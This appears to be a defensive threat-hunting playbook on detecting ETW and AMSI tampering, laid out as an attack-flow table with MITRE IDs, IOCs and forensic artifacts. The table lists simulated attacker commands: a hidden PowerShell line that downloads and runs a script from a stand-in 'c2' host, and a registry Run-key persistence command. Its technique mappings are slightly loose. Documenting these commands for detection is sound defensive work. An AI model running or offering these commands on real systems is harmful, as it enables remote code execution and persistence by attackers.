# 🛡️ ETW / AMSI Tampering Behaviour (T1055.001 / T1089)

**Explanation:** This playbook analyzes the critical stage in an attack where the adversary attempts to disable or bypass host defenses, specifically **Event Tracing for Windows (ETW)** or the **Antimalware Scan Interface (AMSI)**. This technique is a high-confidence indicator of **Defense Evasion (T1055.001, Process Injection)** and is often achieved via memory manipulation (hooking, unhooking, or patching), which serves as the most reliable **Anchor Point** for detection, as it must occur before the final payload executes.

---

## 1. Attack Flow, IOCs, and Simulated Commands

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1566.001 (Phishing) | **File:** Malicious macro-enabled document (e.g., `.xlsm`, `.docm`) containing obfuscated code. | (User enables macro or opens malicious attachment) |
| **Execution/Foothold** | T1059.001 (PowerShell) | **Process:** `powershell.exe` spawned as a child of `winword.exe` or `excel.exe`. | `powershell.exe -w hidden -c "IEX (new-object net.webclient).downloadstring('http://c2/loader.ps1')"` |
| **Tampering (ANCHOR)** | **T1055.001 (Process Injection)** | **Memory/Process:** Anomalous memory modification within **`amsi.dll`** or **`ntdll.dll`**. **API:** Unexpected calls to `WriteProcessMemory`. | (Payload executes in-memory patch to return 0/success for `AmsiScanBuffer`) |
| **Lateral Movement/Persistence** | T1547.001 (Registry Run Keys) | **File/Registry:** Persistence mechanism created, executed by the now-hidden C2 agent. | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Helper" /t REG_SZ /d "C:\Users\Public\tools.exe"` |
| **Impact/Staging** | T1071.001 (Application Layer Protocol) | **Network:** High volume, obfuscated HTTPS/DNS traffic from the newly persistent C2 process. | (Payload begins downloading staging modules or enumerating credentials) |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence Process & Memory IOCs

1.  **Memory Modification:** The single highest-fidelity IOC is an attempt to modify executable memory protections or write to the memory space of key system DLLs, specifically **`amsi.dll`** (for AMSI bypass) or **`ntdll.dll`** (for ETW bypass/unhooking).
2.  **Unusual Parent/Child Chain:** A scripting process (`powershell.exe`, `wscript.exe`) or Office application (`winword.exe`) spawns a secondary process that immediately engages in memory-writing behavior.
3.  **Specific API Calls:** Detection of a process making non-standard calls like **`NtProtectVirtualMemory`** or **`VirtualProtect`** on its own or a child process's memory regions containing defense DLLs.

### File and System IOCs

1.  **Script File Content:** Look for keywords in script files that indicate defense evasion, such as **`AMSI`**, **`ETW`**, **`AmsiScanBuffer`**, **`AmsiInitialize`**, or patterns consistent with reflection or byte array manipulation.
2.  **Suspicious File Drops:** Creation of a loader DLL or executable used specifically to carry out the memory injection technique, often placed in temporary directories (`C:\ProgramData\`).
3.  **Compromised Identity:** The user account executing the entire chain must be flagged for session revocation and credential reset, as the successful tamper allows for privileged actions.
